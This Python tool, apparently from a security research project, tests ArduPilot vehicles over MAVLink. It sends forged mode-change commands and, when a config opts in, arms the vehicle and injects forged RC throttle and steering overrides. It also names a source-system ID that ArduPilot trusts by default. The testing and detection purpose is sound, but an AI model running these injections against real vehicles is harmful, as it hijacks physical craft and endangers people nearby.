#!/usr/bin/env python3
"""
Vehicle-agnostic resilience tester -- points at ANY ArduPilot vehicle (ours
or someone else's) described by a targets/<name>.json config, runs the
requested attacks, and reports two independent axes per attack:

  VULNERABILITY: did the attack actually corrupt the target's own reported
  state (accepted forged GPS, obeyed a forged command)? Outcomes:
  VULNERABLE | RESILIENT | N/A | INCONCLUSIVE -- never a bare pass/fail,
  because for an unknown target "nothing moved" is ambiguous between "it
  resisted" and "it never even ingested the attack," and conflating those
  is a credibility problem, not a detail.

  DETECTABILITY: would detection/detectors.py's DetectorSuite (the same
  blind rule-based monitor used elsewhere in this project) have caught it?
  Wired up in a later phase; this phase focuses on vulnerability.

Ground truth for a target run lives under target_runs/<name>/<run_ts>/,
deliberately separate from attack_logs/ and evidence/ so target runs never
mix with or pollute the existing reference-vehicle evidence trail.

Usage:
  python3 tools/test_target.py --target wamv_local --attacks c2_replay
  python3 tools/test_target.py --target wamv_local   # all enabled attacks
"""
import argparse
import csv
import json
import os
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)
sys.path.insert(0, os.path.join(REPO, "targets"))
sys.path.insert(0, os.path.join(REPO, "attacks"))
from targets.loader import load_target
from pymavlink import mavutil


# --- connection + baseline ---------------------------------------------------

def connect_mavlink(cfg):
    """Opens the MAVLink connection described by a target's mavlink block
    and waits for a heartbeat. Raises on failure -- callers should not
    proceed with a dead connection, since every verdict below depends on
    actually hearing from the target."""
    conn = mavutil.mavlink_connection(cfg["connection"], source_system=cfg["source_system"])
    hb = conn.wait_heartbeat(timeout=15)
    if hb is None:
        raise RuntimeError(f"no heartbeat from target on {cfg['connection']} within 15s")
    return conn


def snapshot_state(conn, settle_s):
    """Samples the target's own telemetry for settle_s seconds. Returns the
    "before" baseline every vulnerability check compares against: believed
    lat/lon, mode, armed state, and the latest SERVO_OUTPUT_RAW seen
    (channels 1/3, the rover steering/throttle convention used elsewhere in
    this project)."""
    conn.mav.request_data_stream_send(conn.target_system, conn.target_component,
                                       mavutil.mavlink.MAV_DATA_STREAM_ALL, 10, 1)
    mode_map = {v: k for k, v in conn.mode_mapping().items()} if conn.mode_mapping() else {}
    baseline = {"lat": None, "lon": None, "mode": None, "armed": None,
                "servo1": None, "servo3": None, "heartbeats": 0, "mode_map": mode_map}
    end = time.time() + settle_s
    while time.time() < end:
        msg = conn.recv_match(blocking=True, timeout=1)
        if msg is None:
            continue
        mt = msg.get_type()
        if mt == "GLOBAL_POSITION_INT" and not (msg.lat == 0 and msg.lon == 0):
            baseline["lat"], baseline["lon"] = msg.lat / 1e7, msg.lon / 1e7
        elif mt == "HEARTBEAT" and msg.type != mavutil.mavlink.MAV_TYPE_GCS:
            baseline["armed"] = bool(msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED)
            baseline["mode"] = mode_map.get(msg.custom_mode, str(msg.custom_mode))
            baseline["heartbeats"] += 1
        elif mt == "SERVO_OUTPUT_RAW":
            baseline["servo1"], baseline["servo3"] = msg.servo1_raw, msg.servo3_raw
    return baseline


def _log_ground_truth(out_dir, wall_ts, attack_type, description):
    """Same wall_ts/attack_type/description schema as attacks/c2_replay.py's
    own CSV, so tools/score_detectors.py's existing window-matching (and its
    inject_rc_override post-hoc duration correction) works unmodified
    against a target run's ground truth in a later phase."""
    path = os.path.join(out_dir, "c2_replay_ground_truth.csv")
    write_header = not os.path.exists(path)
    with open(path, "a", newline="") as f:
        w = csv.writer(f)
        if write_header:
            w.writerow(["wall_ts", "attack_type", "description"])
        w.writerow([wall_ts, attack_type, description])


# --- C2 replay: two independent vulnerability sub-checks ---------------------

def run_c2_mode_change_test(conn, target_cfg, baseline, out_dir):
    """Always runs (no arming needed): does the target accept a forged
    mode-change command with no authentication?"""
    ccfg = target_cfg["attacks"]["c2_replay"]
    forged_mode = ccfg.get("target_mode_for_injection", "HOLD")

    if baseline["heartbeats"] == 0:
        return "INCONCLUSIVE", {"reason": "never received a HEARTBEAT during baseline -- can't establish preconditions"}

    pre_mode = baseline["mode"]
    mode_id = conn.mode_mapping().get(forged_mode)
    if mode_id is None:
        return "INCONCLUSIVE", {"reason": f"target has no mode named '{forged_mode}' to forge"}
    t_inject = time.time()
    # Sent directly (not via attacks/c2_replay.py's inject_forged_mode_change)
    # because that helper also writes to the SHARED attack_logs/
    # c2_replay_ground_truth.csv as a side effect -- target runs must stay
    # isolated from the reference-vehicle evidence trail (see target_runs/
    # docstring at the top of this file).
    conn.mav.set_mode_send(conn.target_system, mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mode_id)
    _log_ground_truth(out_dir, t_inject, "inject_mode", f"forged mode change to {forged_mode}")

    end = time.time() + 5.0
    post_mode = pre_mode
    heartbeats_after = 0
    while time.time() < end:
        msg = conn.recv_match(type="HEARTBEAT", blocking=True, timeout=1)
        if msg is None or msg.type == mavutil.mavlink.MAV_TYPE_GCS:
            continue
        heartbeats_after += 1
        post_mode = baseline["mode_map"].get(msg.custom_mode, str(msg.custom_mode))

    evidence = {"pre_mode": pre_mode, "forged_mode": forged_mode, "post_mode": post_mode,
                "heartbeats_seen_after": heartbeats_after}

    if heartbeats_after == 0:
        evidence["reason"] = "target stopped heartbeating after injection -- possible crash/DoS, not a mode-change result"
        return "INCONCLUSIVE", evidence
    if post_mode == forged_mode and post_mode != pre_mode:
        return "VULNERABLE", evidence
    if post_mode == pre_mode:
        return "RESILIENT", evidence
    evidence["reason"] = f"mode changed to '{post_mode}', neither the pre-mode nor the forged mode"
    return "INCONCLUSIVE", evidence


def run_c2_rc_override_test(conn, target_cfg, baseline, out_dir):
    """Only runs if the target config opts in via allow_arm_and_actuate
    (default false) -- arming/actuating a vehicle we don't control the boot
    of is consequential. Gated on a preconditions_met check: ArduPilot
    ignores RC_CHANNELS_OVERRIDE while disarmed BY DESIGN, so "nothing
    moved" while unarmed must be INCONCLUSIVE, never RESILIENT.

    CAVEAT (see docs/TARGET_TESTING.md / EXECUTION_STATE.md 2026-08-07): a
    target can be confirmed ARMED and still fail to move for reasons
    unrelated to security (a control-output bug, a stuck actuator). Armed
    confirmation is a necessary precondition, not a sufficient one -- a
    RESILIENT verdict here should be corroborated with independent evidence
    the vehicle can move under ANY command before it's treated as a real
    security finding.
    """
    ccfg = target_cfg["attacks"]["c2_replay"]
    if not ccfg.get("allow_arm_and_actuate"):
        return "N/A", {"reason": "allow_arm_and_actuate is false (default) -- skipped"}

    thr = ccfg.get("rc_throttle_pwm", 1700)
    steer = ccfg.get("rc_steering_pwm", 1500)
    duration = ccfg.get("duration_s", 8.0)

    conn.set_mode(conn.mode_mapping().get("MANUAL", 0))
    time.sleep(1.5)
    # Re-send the arm command periodically while continuously draining
    # (unfiltered) for up to ARM_TIMEOUT_S -- a type-filtered recv_match on
    # a busy MAV_DATA_STREAM_ALL@10Hz stream can miss a 1Hz HEARTBEAT inside
    # a short per-attempt window even though arming genuinely succeeded
    # (confirmed empirically: a fixed 5-attempt/1s-timeout loop reported
    # armed=False against a target that a longer, unfiltered poll showed
    # arms immediately). Poll on wall-clock deadline, not attempt count.
    armed = False
    ARM_TIMEOUT_S = 12.0
    last_arm_cmd = 0.0
    end = time.time() + ARM_TIMEOUT_S
    while time.time() < end and not armed:
        if time.time() - last_arm_cmd > 1.0:
            conn.mav.command_long_send(conn.target_system, conn.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)
            last_arm_cmd = time.time()
        msg = conn.recv_match(blocking=True, timeout=0.5)
        if msg is None:
            continue
        if msg.get_type() == "HEARTBEAT" and msg.type != mavutil.mavlink.MAV_TYPE_GCS:
            if bool(msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
                armed = True

    pre_servo3 = baseline.get("servo3")

    # Send the override AND watch SERVO_OUTPUT_RAW in the same loop --
    # attacks/c2_replay.py's inject_forged_rc_override() is a blocking call
    # that also sends the release (revert-to-neutral) before returning, so
    # sampling servo output AFTER it returns observes the released, not the
    # attacked, state (confirmed empirically: a post-hoc sample always read
    # back the pre-attack value even when the override demonstrably worked
    # mid-window). Reimplementing the send loop inline, rather than calling
    # that helper, is what makes concurrent observation possible.
    t_inject = time.time()
    _log_ground_truth(out_dir, t_inject, "inject_rc_override", f"throttle={thr}, steering={steer}, {duration}s")
    peak_servo3 = pre_servo3
    end = time.time() + duration
    while time.time() < end:
        conn.mav.rc_channels_override_send(conn.target_system, conn.target_component,
                                            steer, 0, thr, 0, 0, 0, 0, 0)
        msg = conn.recv_match(type="SERVO_OUTPUT_RAW", blocking=False)
        if msg is not None and (peak_servo3 is None or abs(msg.servo3_raw - (pre_servo3 or 1500)) >
                                 abs(peak_servo3 - (pre_servo3 or 1500))):
            peak_servo3 = msg.servo3_raw
        time.sleep(0.1)
    # release override (all-zero == "ignore", matches c2_replay.py's convention)
    conn.mav.rc_channels_override_send(conn.target_system, conn.target_component, 0, 0, 0, 0, 0, 0, 0, 0)

    evidence = {"armed_confirmed": armed, "pre_servo3": pre_servo3, "peak_servo3_during_injection": peak_servo3,
                "forged_throttle_pwm": thr}

    if not armed:
        evidence["reason"] = "target did not confirm ARMED after the arm sequence -- preconditions not met"
        return "INCONCLUSIVE", evidence
    if pre_servo3 is None or peak_servo3 is None:
        evidence["reason"] = "never observed a SERVO_OUTPUT_RAW message -- can't compare"
        return "INCONCLUSIVE", evidence
    if abs(peak_servo3 - pre_servo3) > 100:
        return "VULNERABLE", evidence
    evidence["caveat"] = (
        "armed confirmed and RC override sent, but servo output did not move. Candidate causes, "
        "most to least likely: (1) the target's SYSID_MYGCS does not match the source_system used "
        "here (ArduPilot only honors RC_CHANNELS_OVERRIDE from the sender it's configured to trust -- "
        "confirmed empirically in this project: source_system=250 is silently dropped, 255 [ArduPilot's "
        "default SYSID_MYGCS] is honored, so a target that changed this default would legitimately "
        "block the attack this way); (2) MAVLink2 message signing; (3) an unrelated control-output "
        "fault (stuck actuator, failsafe) unrelated to any real security control. Corroborate with "
        "independent evidence the vehicle can move under ANY command before treating this as a "
        "security result."
    )
    return "RESILIENT", evidence


def run_c2_replay_test(conn, target_cfg, baseline, out_dir):
    mode_verdict, mode_evidence = run_c2_mode_change_test(conn, target_cfg, baseline, out_dir)
    time.sleep(2)  # let the mode-change settle before the (optional) override sub-check
    rc_verdict, rc_evidence = run_c2_rc_override_test(conn, target_cfg, baseline, out_dir)
    return {
        "mode_change": {"verdict": mode_verdict, "evidence": mode_evidence},
        "rc_override": {"verdict": rc_verdict, "evidence": rc_evidence},
    }


# --- orchestration -------------------------------------------------------

def run_target_test(target_name, requested_attacks=None):
    target = load_target(target_name)
    run_ts = time.strftime("%Y%m%dT%H%M%S")
    out_dir = os.path.join(REPO, "target_runs", target["name"], run_ts)
    os.makedirs(out_dir, exist_ok=True)

    print(f"[test_target] target={target['name']} domain={target['domain']} -> {target['mavlink']['connection']}")
    conn = connect_mavlink(target["mavlink"])
    print(f"[test_target] connected, sampling baseline for {target['timing']['settle_s']}s ...")
    baseline = snapshot_state(conn, target["timing"]["settle_s"])
    print(f"[test_target] baseline: {baseline}")

    enabled = target.get("attacks", {})
    to_run = requested_attacks or [a for a in enabled if enabled[a].get("enabled")]

    results = {"target": target["name"], "domain": target["domain"], "run_ts": run_ts,
               "baseline": {k: v for k, v in baseline.items() if k != "mode_map"},
               "attacks": {}}

    if "c2_replay" in to_run and enabled.get("c2_replay", {}).get("enabled"):
        print("[test_target] running c2_replay vulnerability checks ...")
        results["attacks"]["c2_replay"] = run_c2_replay_test(conn, target, baseline, out_dir)
        print(f"[test_target]   mode_change: {results['attacks']['c2_replay']['mode_change']['verdict']}")
        print(f"[test_target]   rc_override: {results['attacks']['c2_replay']['rc_override']['verdict']}")

    out_path = os.path.join(out_dir, "verdicts.json")
    with open(out_path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"[test_target] wrote {out_path}")
    return results


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--attacks", default=None, help="comma-separated subset, e.g. c2_replay,ais_spoof")
    args = ap.parse_args()
    requested = args.attacks.split(",") if args.attacks else None
    run_target_test(args.target, requested)


if __name__ == "__main__":
    main()
